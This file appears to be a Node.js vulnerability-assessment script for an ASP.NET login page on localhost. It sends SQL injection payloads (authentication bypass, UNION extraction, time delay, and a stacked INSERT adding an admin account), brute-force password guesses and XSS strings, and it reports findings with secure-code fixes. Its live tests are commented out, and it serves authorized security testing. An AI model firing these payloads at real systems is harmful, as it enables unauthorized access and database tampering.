const axios = require('axios');
const colors = require('colors');

class LoginVulnerabilityTester {
    constructor(baseUrl = 'http://localhost:44393') {
        this.baseUrl = baseUrl;
        this.vulnerabilities = [];
        this.testResults = [];
    }

    log(message, type = 'info') {
        const timestamp = new Date().toISOString();
        switch(type) {
            case 'success':
                console.log(`[${timestamp}] ✓ ${message}`.green);
                break;
            case 'warning':
                console.log(`[${timestamp}] ⚠ ${message}`.yellow);
                break;
            case 'error':
                console.log(`[${timestamp}] ✗ ${message}`.red);
                break;
            case 'critical':
                console.log(`[${timestamp}] 🚨 CRITICAL: ${message}`.red.bold);
                break;
            default:
                console.log(`[${timestamp}] ℹ ${message}`.blue);
        }
    }

    addVulnerability(severity, title, description, impact, recommendation, evidence = '') {
        this.vulnerabilities.push({
            severity,
            title,
            description,
            impact,
            recommendation,
            evidence,
            timestamp: new Date().toISOString()
        });
    }

    // Test 1: SQL Injection in Login Form
    async testSQLInjection() {
        this.log('Testing SQL Injection Vulnerabilities in Login Form...', 'info');
        
        const sqlPayloads = [
            {
                name: 'Basic OR Injection',
                username: "admin' OR '1'='1' --",
                password: "anything",
                description: 'Attempts to bypass authentication with OR condition'
            },
            {
                name: 'Union-based Data Extraction',
                username: "admin' UNION SELECT 'admin','password','Admin',1,'admin','1','2023-01-01','1','test','127.0.0.1','YTL','admin' --",
                password: "password",
                description: 'Attempts to extract data using UNION SELECT'
            },
            {
                name: 'Time-based Blind Injection',
                username: "admin'; WAITFOR DELAY '00:00:05' --",
                password: "test",
                description: 'Tests for time-based SQL injection'
            },
            {
                name: 'Error-based Injection',
                username: "admin' AND (SELECT COUNT(*) FROM userTBL) > 0 --",
                password: "test",
                description: 'Attempts to trigger SQL errors for information disclosure'
            },
            {
                name: 'Stacked Query Injection',
                username: "admin'; INSERT INTO userTBL (username,pwd,role) VALUES ('hacker','password123','Admin'); --",
                password: "test",
                description: 'Attempts to execute additional SQL commands'
            }
        ];

        for (const payload of sqlPayloads) {
            try {
                const startTime = Date.now();
                
                const response = await axios.post(`${this.baseUrl}/login.aspx`, 
                    `uname=${encodeURIComponent(payload.username)}&password=${encodeURIComponent(payload.password)}`,
                    {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        },
                        maxRedirects: 0,
                        validateStatus: () => true,
                        timeout: 10000
                    }
                );

                const responseTime = Date.now() - startTime;

                // Check for successful bypass (redirect to Main.aspx)
                if (response.status === 302 && response.headers.location?.includes('Main.aspx')) {
                    this.addVulnerability(
                        'CRITICAL',
                        'SQL Injection Authentication Bypass',
                        `${payload.name}: ${payload.description}`,
                        'Complete authentication bypass, unauthorized access to application',
                        'Use parameterized queries instead of string concatenation',
                        `Payload: ${payload.username}`
                    );
                    this.log(`CRITICAL: Authentication bypassed with ${payload.name}!`, 'critical');
                }

                // Check for SQL error messages
                if (response.data.includes('SQL') || 
                    response.data.includes('OLE DB') || 
                    response.data.includes('ODBC') ||
                    response.data.includes('SqlException') ||
                    response.data.includes('System.Data')) {
                    
                    this.addVulnerability(
                        'HIGH',
                        'SQL Injection Information Disclosure',
                        `${payload.name}: SQL error messages exposed`,
                        'Database structure and error information disclosed to attackers',
                        'Implement proper error handling and use parameterized queries',
                        `Error details found in response`
                    );
                    this.log(`SQL error disclosure found with ${payload.name}`, 'error');
                }

                // Check for time-based injection (response time > 4 seconds indicates WAITFOR DELAY worked)
                if (payload.name.includes('Time-based') && responseTime > 4000) {
                    this.addVulnerability(
                        'CRITICAL',
                        'Time-based SQL Injection',
                        `${payload.name}: Server response delayed indicating SQL injection`,
                        'Blind SQL injection possible, database compromise likely',
                        'Use parameterized queries and input validation',
                        `Response time: ${responseTime}ms`
                    );
                    this.log(`Time-based SQL injection confirmed with ${payload.name}`, 'critical');
                }

            } catch (error) {
                if (error.code === 'ECONNRESET' || error.message.includes('timeout')) {
                    this.log(`Potential SQL injection causing server issues with ${payload.name}`, 'warning');
                    this.addVulnerability(
                        'HIGH',
                        'SQL Injection Server Impact',
                        `${payload.name}: Caused server connection issues`,
                        'SQL injection may be causing server instability',
                        'Implement input validation and parameterized queries',
                        `Error: ${error.message}`
                    );
                } else {
                    this.log(`Error testing ${payload.name}: ${error.message}`, 'error');
                }
            }
        }
    }

    // Test 2: Brute Force Attack
    async testBruteForce() {
        this.log('Testing Brute Force Protection...', 'info');
        
        const commonPasswords = ['password', '123456', 'admin', 'password123', 'qwerty', 'letmein'];
        const testUsername = 'admin';
        let successfulAttempts = 0;
        let blockedAttempts = 0;

        for (let i = 0; i < commonPasswords.length; i++) {
            try {
                const response = await axios.post(`${this.baseUrl}/login.aspx`, 
                    `uname=${testUsername}&password=${commonPasswords[i]}`,
                    {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        maxRedirects: 0,
                        validateStatus: () => true
                    }
                );

                if (response.status === 302 && response.headers.location?.includes('Main.aspx')) {
                    successfulAttempts++;
                    this.log(`Successful login with password: ${commonPasswords[i]}`, 'warning');
                } else if (response.status === 429 || response.data.includes('blocked') || response.data.includes('locked')) {
                    blockedAttempts++;
                    this.log(`Account locked or rate limited after ${i + 1} attempts`, 'success');
                    break;
                }

                // Small delay between attempts
                await new Promise(resolve => setTimeout(resolve, 100));

            } catch (error) {
                this.log(`Brute force test error: ${error.message}`, 'error');
            }
        }

        if (blockedAttempts === 0 && successfulAttempts === 0) {
            this.addVulnerability(
                'MEDIUM',
                'No Brute Force Protection',
                'Login form allows unlimited login attempts without rate limiting',
                'Attackers can perform brute force attacks to guess passwords',
                'Implement account lockout and rate limiting after failed attempts'
            );
            this.log('No brute force protection detected', 'warning');
        }
    }

    // Test 3: Cross-Site Scripting (XSS)
    async testXSS() {
        this.log('Testing Cross-Site Scripting Vulnerabilities...', 'info');
        
        const xssPayloads = [
            {
                name: 'Basic Script Injection',
                payload: "<script>alert('XSS')</script>",
                field: 'username'
            },
            {
                name: 'Event Handler Injection',
                payload: "admin\" onmouseover=\"alert('XSS')\"",
                field: 'username'
            },
            {
                name: 'JavaScript URL',
                payload: "javascript:alert('XSS')",
                field: 'username'
            },
            {
                name: 'IMG Tag Injection',
                payload: "<img src=x onerror=alert('XSS')>",
                field: 'username'
            },
            {
                name: 'SVG Injection',
                payload: "<svg onload=alert('XSS')>",
                field: 'password'
            }
        ];

        for (const xss of xssPayloads) {
            try {
                const formData = xss.field === 'username' 
                    ? `uname=${encodeURIComponent(xss.payload)}&password=test`
                    : `uname=test&password=${encodeURIComponent(xss.payload)}`;

                const response = await axios.post(`${this.baseUrl}/login.aspx`, formData, {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    validateStatus: () => true
                });

                // Check if payload is reflected in response without proper encoding
                if (response.data.includes(xss.payload) && 
                    !response.data.includes('&lt;') && 
                    !response.data.includes('&gt;')) {
                    
                    this.addVulnerability(
                        'HIGH',
                        'Reflected Cross-Site Scripting (XSS)',
                        `${xss.name}: XSS payload reflected in ${xss.field} field`,
                        'Session hijacking, credential theft, malicious redirects possible',
                        'Implement proper input validation and output encoding',
                        `Payload: ${xss.payload}`
                    );
                    this.log(`XSS vulnerability found: ${xss.name}`, 'critical');
                }

            } catch (error) {
                this.log(`XSS test error for ${xss.name}: ${error.message}`, 'error');
            }
        }
    }

    // Test 4: CSRF Protection
    async testCSRF() {
        this.log('Testing CSRF Protection...', 'info');
        
        try {
            // First, get the login page to check for CSRF tokens
            const getResponse = await axios.get(`${this.baseUrl}/login.aspx`);
            
            const hasCSRFToken = getResponse.data.includes('__RequestVerificationToken') ||
                                getResponse.data.includes('csrf') ||
                                getResponse.data.includes('token');

            if (!hasCSRFToken) {
                this.addVulnerability(
                    'MEDIUM',
                    'Missing CSRF Protection',
                    'Login form does not implement CSRF tokens',
                    'Cross-site request forgery attacks possible',
                    'Implement CSRF tokens in all forms'
                );
                this.log('No CSRF protection found', 'warning');
            }

            // Test if form accepts requests without proper referrer
            const csrfResponse = await axios.post(`${this.baseUrl}/login.aspx`, 
                'uname=test&password=test',
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': 'http://malicious-site.com'
                    },
                    validateStatus: () => true
                }
            );

            if (csrfResponse.status !== 403 && !csrfResponse.data.includes('Invalid request')) {
                this.addVulnerability(
                    'MEDIUM',
                    'CSRF Vulnerability',
                    'Login form accepts requests from external referrers',
                    'Cross-site request forgery attacks possible',
                    'Implement referrer validation and CSRF tokens'
                );
                this.log('CSRF vulnerability confirmed', 'warning');
            }

        } catch (error) {
            this.log(`CSRF test error: ${error.message}`, 'error');
        }
    }

    // Test 5: Information Disclosure
    async testInformationDisclosure() {
        this.log('Testing Information Disclosure...', 'info');
        
        try {
            // Test with invalid credentials to check error messages
            const response = await axios.post(`${this.baseUrl}/login.aspx`, 
                'uname=nonexistentuser&password=wrongpassword',
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    validateStatus: () => true
                }
            );

            // Check for detailed error messages that reveal system information
            const sensitivePatterns = [
                /System\./,
                /Exception/,
                /Stack Trace/,
                /SqlConnection/,
                /Database/,
                /Server Error/,
                /OLE DB/,
                /ODBC/
            ];

            for (const pattern of sensitivePatterns) {
                if (pattern.test(response.data)) {
                    this.addVulnerability(
                        'MEDIUM',
                        'Information Disclosure',
                        'Login page reveals sensitive system information in error messages',
                        'System architecture and technology stack disclosed to attackers',
                        'Implement generic error messages and custom error pages'
                    );
                    this.log('Information disclosure found in error messages', 'warning');
                    break;
                }
            }

            // Check if different error messages reveal user enumeration
            const userEnumTest1 = await axios.post(`${this.baseUrl}/login.aspx`, 
                'uname=admin&password=wrongpassword',
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    validateStatus: () => true
                }
            );

            const userEnumTest2 = await axios.post(`${this.baseUrl}/login.aspx`, 
                'uname=nonexistentuser123456&password=wrongpassword',
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    validateStatus: () => true
                }
            );

            if (userEnumTest1.data !== userEnumTest2.data) {
                this.addVulnerability(
                    'LOW',
                    'User Enumeration',
                    'Different error messages for valid vs invalid usernames',
                    'Attackers can enumerate valid usernames',
                    'Use identical error messages for all authentication failures'
                );
                this.log('User enumeration vulnerability found', 'warning');
            }

        } catch (error) {
            this.log(`Information disclosure test error: ${error.message}`, 'error');
        }
    }

    // Test 6: Session Management
    async testSessionManagement() {
        this.log('Testing Session Management...', 'info');
        
        try {
            // Test if login creates secure session cookies
            const response = await axios.post(`${this.baseUrl}/login.aspx`, 
                'uname=testuser&password=testpass',
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    maxRedirects: 0,
                    validateStatus: () => true
                }
            );

            const cookies = response.headers['set-cookie'] || [];
            let hasSecureFlag = false;
            let hasHttpOnlyFlag = false;
            let hasSameSiteFlag = false;

            cookies.forEach(cookie => {
                if (cookie.includes('Secure')) hasSecureFlag = true;
                if (cookie.includes('HttpOnly')) hasHttpOnlyFlag = true;
                if (cookie.includes('SameSite')) hasSameSiteFlag = true;
            });

            if (!hasSecureFlag) {
                this.addVulnerability(
                    'MEDIUM',
                    'Insecure Cookie Configuration',
                    'Session cookies do not have Secure flag',
                    'Cookies can be transmitted over unencrypted connections',
                    'Set Secure flag on all session cookies'
                );
            }

            if (!hasHttpOnlyFlag) {
                this.addVulnerability(
                    'MEDIUM',
                    'Missing HttpOnly Flag',
                    'Session cookies do not have HttpOnly flag',
                    'Cookies accessible via JavaScript, XSS attacks more dangerous',
                    'Set HttpOnly flag on all session cookies'
                );
            }

            if (!hasSameSiteFlag) {
                this.addVulnerability(
                    'LOW',
                    'Missing SameSite Flag',
                    'Session cookies do not have SameSite flag',
                    'CSRF attacks may be easier to execute',
                    'Set SameSite flag on all session cookies'
                );
            }

        } catch (error) {
            this.log(`Session management test error: ${error.message}`, 'error');
        }
    }

    // Test 7: Password Policy
    async testPasswordPolicy() {
        this.log('Testing Password Policy...', 'info');
        
        const weakPasswords = [
            { password: '1', description: 'Single character' },
            { password: '123', description: 'Short numeric' },
            { password: 'a', description: 'Single letter' },
            { password: 'password', description: 'Common word' },
            { password: '          ', description: 'Spaces only' }
        ];

        for (const test of weakPasswords) {
            try {
                const response = await axios.post(`${this.baseUrl}/login.aspx`, 
                    `uname=testuser&password=${encodeURIComponent(test.password)}`,
                    {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        validateStatus: () => true
                    }
                );

                // If no client-side validation prevents submission
                if (response.status === 200 && !response.data.includes('password requirements')) {
                    this.addVulnerability(
                        'LOW',
                        'Weak Password Policy',
                        `No validation for weak passwords: ${test.description}`,
                        'Users can set weak passwords that are easily guessed',
                        'Implement strong password requirements and validation'
                    );
                    this.log(`Weak password accepted: ${test.description}`, 'warning');
                    break; // Only report once
                }

            } catch (error) {
                this.log(`Password policy test error: ${error.message}`, 'error');
            }
        }
    }

    // Static Code Analysis of login.aspx.vb
    analyzeLoginCode() {
        this.log('Performing Static Code Analysis...', 'info');
        
        const codeVulnerabilities = [
            {
                severity: 'CRITICAL',
                title: 'SQL Injection in Authentication Query',
                description: 'Direct string concatenation in SQL query: "select pwd,role,userid,username... where upper(username) =\'" & UCase(uname.Value) & "\'"',
                impact: 'Complete authentication bypass and database compromise',
                recommendation: 'Use parameterized queries with cmd.Parameters.AddWithValue()',
                line: 'Line 25 in login.aspx.vb'
            },
            {
                severity: 'HIGH',
                title: 'Plain Text Password Comparison',
                description: 'Passwords compared in plain text: "If UCase(dr("pwd")) = UCase(password.Value)"',
                impact: 'Passwords stored and compared in plain text',
                recommendation: 'Implement proper password hashing (BCrypt, PBKDF2, or Argon2)',
                line: 'Line 32 in login.aspx.vb'
            },
            {
                severity: 'HIGH',
                title: 'Client-Side Session Management',
                description: 'Authentication state stored in cookies instead of server-side sessions',
                impact: 'Session hijacking and authentication bypass possible',
                recommendation: 'Implement server-side session management',
                line: 'Multiple lines in login.aspx.vb'
            },
            {
                severity: 'MEDIUM',
                title: 'Information Disclosure in Error Messages',
                description: 'Generic exception handling may expose system information',
                impact: 'System architecture and database details disclosed',
                recommendation: 'Implement specific error handling with generic user messages',
                line: 'Exception handling blocks'
            },
            {
                severity: 'MEDIUM',
                title: 'No Input Validation',
                description: 'User input not validated or sanitized before database query',
                impact: 'Various injection attacks possible',
                recommendation: 'Implement comprehensive input validation',
                line: 'Throughout login.aspx.vb'
            },
            {
                severity: 'LOW',
                title: 'Hardcoded User IDs',
                description: 'Special user privileges hardcoded: "If dr("userid") = "6941" Or dr("userid") = "3342"..."',
                impact: 'Maintenance issues and potential privilege escalation',
                recommendation: 'Store user privileges in database with proper role management',
                line: 'Lines 85-87 in login.aspx.vb'
            }
        ];

        codeVulnerabilities.forEach(vuln => {
            this.addVulnerability(
                vuln.severity,
                vuln.title,
                vuln.description,
                vuln.impact,
                vuln.recommendation,
                vuln.line
            );
        });
    }

    // Generate comprehensive report
    generateReport() {
        this.log('\n' + '='.repeat(80), 'info');
        this.log('LOGIN.ASPX VULNERABILITY ASSESSMENT REPORT', 'info');
        this.log('='.repeat(80), 'info');
        
        if (this.vulnerabilities.length === 0) {
            this.log('No vulnerabilities found during testing.', 'success');
            return;
        }

        const criticalVulns = this.vulnerabilities.filter(v => v.severity === 'CRITICAL');
        const highVulns = this.vulnerabilities.filter(v => v.severity === 'HIGH');
        const mediumVulns = this.vulnerabilities.filter(v => v.severity === 'MEDIUM');
        const lowVulns = this.vulnerabilities.filter(v => v.severity === 'LOW');

        this.log(`\nEXECUTIVE SUMMARY:`, 'info');
        this.log(`The login.aspx page contains ${this.vulnerabilities.length} security vulnerabilities`, 'info');
        this.log(`Critical: ${criticalVulns.length}`, criticalVulns.length > 0 ? 'critical' : 'info');
        this.log(`High: ${highVulns.length}`, highVulns.length > 0 ? 'error' : 'info');
        this.log(`Medium: ${mediumVulns.length}`, mediumVulns.length > 0 ? 'warning' : 'info');
        this.log(`Low: ${lowVulns.length}`, 'info');

        this.log('\nDETAILED FINDINGS:', 'info');
        this.log('-'.repeat(50), 'info');

        this.vulnerabilities.forEach((vuln, index) => {
            this.log(`\n${index + 1}. ${vuln.title} [${vuln.severity}]`, 
                vuln.severity === 'CRITICAL' ? 'critical' : 
                vuln.severity === 'HIGH' ? 'error' : 
                vuln.severity === 'MEDIUM' ? 'warning' : 'info');
            
            console.log(`   Description: ${vuln.description}`);
            console.log(`   Impact: ${vuln.impact}`);
            console.log(`   Recommendation: ${vuln.recommendation}`);
            if (vuln.evidence) {
                console.log(`   Evidence: ${vuln.evidence}`.gray);
            }
        });

        this.log('\nIMMEDIATE ACTIONS REQUIRED:', 'critical');
        this.log('-'.repeat(50), 'info');
        this.log('1. Replace SQL string concatenation with parameterized queries', 'critical');
        this.log('2. Implement proper password hashing', 'critical');
        this.log('3. Move authentication to server-side sessions', 'critical');
        this.log('4. Add comprehensive input validation', 'error');
        this.log('5. Implement proper error handling', 'error');

        this.log('\nSECURE CODE EXAMPLES:', 'info');
        this.log('-'.repeat(50), 'info');
        
        console.log(`
SECURE SQL QUERY:
Dim cmd As New SqlCommand("SELECT pwd,role,userid,username FROM userTBL WHERE username = @username AND drcaccess='0'", conn)
cmd.Parameters.AddWithValue("@username", uname.Value)

SECURE PASSWORD VERIFICATION:
If BCrypt.Verify(password.Value, hashedPasswordFromDB) Then
    ' Authentication successful
End If

SECURE SESSION MANAGEMENT:
Session("authenticated") = True
Session("userid") = userid
Session("username") = username
Session("loginTime") = DateTime.Now
        `.green);

        this.log('\nCOMPLIANCE IMPACT:', 'warning');
        this.log('These vulnerabilities may violate:', 'warning');
        this.log('• OWASP Top 10 security standards', 'warning');
        this.log('• PCI DSS requirements', 'warning');
        this.log('• GDPR data protection requirements', 'warning');
        this.log('• Industry-specific security standards', 'warning');
    }

    // Run all vulnerability tests
    async runAllTests() {
        this.log('Starting Comprehensive Vulnerability Assessment for login.aspx...', 'info');
        this.log('Target: ' + this.baseUrl + '/login.aspx', 'info');
        this.log('-'.repeat(80), 'info');

        // Static analysis first
        this.analyzeLoginCode();

        // Dynamic tests (commented out for safety - uncomment when testing against authorized targets)
        this.log('\nNOTE: Dynamic tests are commented out for safety.', 'warning');
        this.log('Uncomment the following lines to run against authorized test environments:', 'warning');
        
        console.log('// await this.testSQLInjection();'.gray);
        console.log('// await this.testBruteForce();'.gray);
        console.log('// await this.testXSS();'.gray);
        console.log('// await this.testCSRF();'.gray);
        console.log('// await this.testInformationDisclosure();'.gray);
        console.log('// await this.testSessionManagement();'.gray);
        console.log('// await this.testPasswordPolicy();'.gray);

        // Uncomment these lines for actual testing:
        /*
        await this.testSQLInjection();
        await this.testBruteForce();
        await this.testXSS();
        await this.testCSRF();
        await this.testInformationDisclosure();
        await this.testSessionManagement();
        await this.testPasswordPolicy();
        */

        this.generateReport();
    }
}

// Export for use in other modules
module.exports = LoginVulnerabilityTester;

// Main execution
async function main() {
    console.log('LOGIN.ASPX VULNERABILITY TESTING SUITE'.rainbow);
    console.log('====================================='.rainbow);
    console.log('⚠️  FOR AUTHORIZED TESTING ONLY ⚠️'.yellow.bold);
    console.log('');
    
    const tester = new LoginVulnerabilityTester();
    await tester.runAllTests();
    
    console.log('\n🔒 Vulnerability assessment complete!'.green);
    console.log('📋 Review the findings above and implement security fixes immediately.'.yellow);
}

// Only run if this file is executed directly
if (require.main === module) {
    main().catch(console.error);
}